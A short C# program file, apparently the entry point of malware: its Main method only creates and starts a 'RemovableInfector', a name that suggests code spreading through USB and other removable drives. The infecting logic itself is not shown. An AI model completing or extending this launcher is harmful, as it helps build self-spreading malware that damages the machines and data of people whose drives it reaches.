using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    class Program
    {
        static void Main(string[] args)
        {
            RemovableInfector infector = new RemovableInfector();
            infector.Start();
        }
    }
}
